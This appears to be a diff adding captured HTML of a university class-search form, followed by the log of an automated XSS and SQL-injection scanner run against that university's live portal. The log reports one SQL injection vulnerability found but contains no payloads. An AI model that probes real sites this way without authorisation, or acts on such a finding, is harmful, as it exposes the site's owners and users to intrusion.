+<option value="COMP-ENGR">Computer Engineering</option>
+<option value="COMP SCI">Computer Science</option>
+<option value="CSLEDSCPSY">Counslr Educ &amp; Schl Psychology</option>
+<option value="CRIM JUST">Criminal Justice</option>
+<option value="DEANCAS">Dean's Office CAS</option>
+<option value="DEANCOHPA">Dean's Office COHPA</option>
+<option value="DEANEDUC">Dean's Office EDUC</option>
+<option value="DEANENG">Dean's Office ENGR</option>
+<option value="ECONOMICS">Economics</option>
+<option value="EDLDRHED">Ed Ldrshp &amp; Higher Education</option>
+<option value="EDUC STDS">Educational Studies</option>
+<option value="ELEC-ENGR">Electrical Engineering</option>
+<option value="EE/CE">Electrical Engr &amp; Comp Sci</option>
+<option value="CORE">Engineering Core</option>
+<option value="TECHNOLOGY">Engineering Technology</option>
+<option value="ENGLISH">English</option>
+<option value="FINANCE">Finance</option>
+<option value="HIM">Health Info Mgmt</option>
+<option value="HLTH SCI">Health Sciences</option>
+<option value="HEALTHSERV">Health Services Admin</option>
+<option value="HISTORY">History</option>
+<option value="HOSP MANG">Hospitality Operations</option>
+<option value="IEMS">Industrial Engr &amp; Mgmt Sys</option>
+<option value="IDS-CAS">Interdisciplinary CAS</option>
+<option value="IDS-COHPA">Interdisciplinary COHPA</option>
+<option value="JUDAIC STS">Judaic Studies</option>
+<option value="KNSLGY-PT">Kinesiology&amp;Phys Thpy, Schl of</option>
+<option value="LRNEDRSCH">Learning Sci &amp; Educ Research</option>
+<option value="LEGAL ST">Legal Studies</option>
+<option value="MANAGEMENT">Management</option>
+<option value="MARKETING">Marketing</option>
+<option value="MSE">Materials Sci &amp; Engineering</option>
+<option value="MATH">Mathematics</option>
+<option value="MECH/AERO">Mechanical &amp; Aerospace Engr</option>
+<option value="MIS">Mgmt Info Systems</option>
+<option value="SMST">Mod, Sim &amp; Trng, School of</option>
+<option value="FOR LANG">Modern Languages</option>
+<option value="MICRO">Molecular Biology &amp; Micro</option>
+<option value="NURSING">Nursing</option>
+<option value="LIBERAL ST">Office of Interdisc Studies</option>
+<option value="OPTICS">Optics and Photonics</option>
+<option value="PERFMGARTS">Performing Arts, Schl of</option>
+<option value="PHILOSOPHY">Philosophy</option>
+<option value="PT">Physical Therapy</option>
+<option value="PHYSICS">Physics</option>
+<option value="POL SCI">Pol, Scty &amp; Intl Afrs, Schl of</option>
+<option value="PSYCHOLOGY">Psychology</option>
+<option value="PUB ADM">Public Administration, Schl of</option>
+<option value="PUB AFF">Public Affairs PhD</option>
+<option value="RADSCI">Radiological Sciences</option>
+<option value="SOC WORK">Social Work, Schl of</option>
+<option value="SOCIOLOGY">Sociology</option>
+<option value="SOC/ANTHRO">Sociology &amp; Anthropology</option>
+<option value="STATISTICS">Statistics &amp; Data Science</option>
+<option value="TCHREDUC">Teacher Education, Schl of</option>
+<option value="TOURATTEVT">Tourism, Events and Attraction</option>
+<option value="VISARTDES">Visual Arts &amp; Design, Schl of</option>
+<option value="WOMENS ST">Womens Studies</option>
+<option value="WRITE RHET">Writing and Rhetoric</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="12"></td>
+<td align="right" colspan="6" valign="top">
+<div id="win0divATTR_VALlbl$19"><label class="PSDROPDOWNLABEL" for="ATTR_VAL$19" id="ATTR_VAL_LBL$19">Department</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="3" height="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="3" height="9"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="4"></td>
+</tr>
+<tr>
+<td height="18"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField183">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="715">
+<tr>
+<td width="713">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_$ICField183" role="presentation" style="border-style:none" width="713">
+<tr>
+<td height="0" width="417"></td>
+<td width="140"></td>
+<td width="156"></td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_SSR_PB_CLEAR"><a class="PSPUSHBUTTON Left" role="presentation"><span style="background-Color: transparent;"><input class="PSPUSHBUTTON" id="CLASS_SRCH_WRK2_SSR_PB_CLEAR" name="CLASS_SRCH_WRK2_SSR_PB_CLEAR" onclick="submitAction_win0(document.win0,this.id,event);" style="width:110px; " tabindex="1393" title="Clear Criteria" type="button" value="Clear"/></span></a></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_SSR_PB_CLASS_SRCH"><a class="PSPUSHBUTTON Left" role="presentation"><span style="background-Color: transparent;"><input class="PSPUSHBUTTON" id="CLASS_SRCH_WRK2_SSR_PB_CLASS_SRCH" name="CLASS_SRCH_WRK2_SSR_PB_CLASS_SRCH" onclick="submitAction_win0(document.win0,this.id,event);" style="width:114px; " tabindex="1394" type="button" value="Search"/></span></a></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="2"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="7" height="10"></td>
+</tr>
+<tr>
+<td colspan="2" height="43"></td>
+<td align="left" colspan="5" nowrap="nowrap" valign="top">
+<div id="win0divFX_CLSSRCH_DER_FLAG"><input id="FX_CLSSRCH_DER_FLAG$chk" name="FX_CLSSRCH_DER_FLAG$chk" type="hidden" value="N"/><input class="PSCHECKBOX" id="FX_CLSSRCH_DER_FLAG" name="FX_CLSSRCH_DER_FLAG" onclick="setupTimeout2();    this.form.FX_CLSSRCH_DER_FLAG$chk.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="1397" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="FX_CLSSRCH_DER_FLAG" id="FX_CLSSRCH_DER_FLAG_LBL">Verify Search</label></div>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<a id="ICLastAnchor_win0" name="ICLastAnchor_win0"></a> <!-- Embedded Help popup Begin -->
+<div id="HelppopupDiv_win0" style="display:none; position:absolute; top:0; left:0">t</div>
+<div class="popupDragFrame" id="HelpDragFrame_win0"> </div>
+<table border="0" cellpadding="0" cellspacing="0" id="HelppopupContainer_win0" style="opacity:1; display:none; position:absolute; top:0; left:0" width="20">
+<tr>
+<td align="left" class="HelppopupInner" id="HelppopupInner_win0" style="position:absolute;z-Index:302;" valign="top">
+<div class="PTPOPUP_HEADER HelppopupTitleBar" id="HelppopupTitleBar_win0" style="width:341px">
+<div class="HelppopupTitleBarMiddle" dir="ltr" id="HelppopupTitleBarMiddle_win0" style="width:333px">
+<table>
+<tr>
+<td id="HelppopupTitle_win0" style="width:290px; cursor: move;"><span class="PTPOPUP_TITLE">Help</span></td>
+<td style="width:45px"><img align="right" alt="Close" id="#HELPPOPUPCLOSE" onclick='HelppopupObj_win0.StopPopup("win0");' onkeypress="var kC=keyPressHandler(event); if (kC==13 || kC==32) HelppopupObj_win0.StopPopup('win0');" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_PORTAL_IC_CLOSE_1.gif" style="cursor:pointer" tabindex="0" title="Close"/></td>
+</tr>
+</table>
+</div>
+</div>
+<div class="MOBGImage HelpdivpopupFrame" id="HelpdivpopupFrame_win0" onclick="HelppopupObj_win0.SetFocusFlag(false);" style="border: 1px #bcbaba solid; padding:12px; overflow:auto;" tabindex="-1">test</div>
+<div class="popupShadow" id="HelppopupShadow" style="position:absolute;z-index:-1;">
+<div class="popupShadowTopRightCorner" id="HelppopupShadowTopRightCorner" style="height:10px;"> </div>
+<div class="popupShadowTop" id="HelppopupShadowTop"> </div>
+<div class="popupShadowBottom" id="HelppopupShadowBottom" style="height:10px">
+<div class="popupShadowBottomLeftCorner" id="HelppopupShadowBottomLeftCorner" style="height:10px;width:10px"> </div>
+<div class="popupShadowBottomMiddle" id="HelppopupShadowBottomMiddle" style="height:10px;"> </div>
+<div class="popupShadowBottomRightCorner" id="HelppopupShadowBottomRightCorner" style="height:10px;width:10px"> </div>
+</div>
+</div>
+</td>
+</tr>
+</table>
+<!-- Embedded Help popup End  -->
+<div id="pt_fakeBC" style="display:none">
+<ul>
+<li class="pthnavhiearchysep pthbcdispiblock"> </li>
+<li class="pthnavbarcref ptabncrefbc ptfakercfbc pthbcdispiblock" id="pthnavbccref_PT_FAKE_CLASS_SEARCH_GBL"><a class="abnanchor" href="https://csprod-ss.net.ucf.edu/psc/CSPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501&amp;PortalRegistryName=GUEST&amp;PortalServletURI=https%3a%2f%2fmy.ucf.edu%2fpsp%2fIHPROD%2f&amp;PortalURI=https%3a%2f%2fmy.ucf.edu%2fpsc%2fIHPROD%2f&amp;PortalHostNode=EMPL&amp;NoCrumbs=yes" id="pthnavbccrefanc_CLASS_SEARCH_GBL" role="menuitem" target="TargetContent">View Schedule of Classes</a>
+<div class="pthnavcrefimg"> </div>
+</li>
+</ul>
+</div>
+</form>
+
+
+
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+
+Total number of URLs scanned for XSS
+count =  3
+XSS Vulnerabilities found in
+count =  0
+Total number of URLs scanned for SQLi
+count =  3
+SQLi Vulnerabilities found in
+count =  1
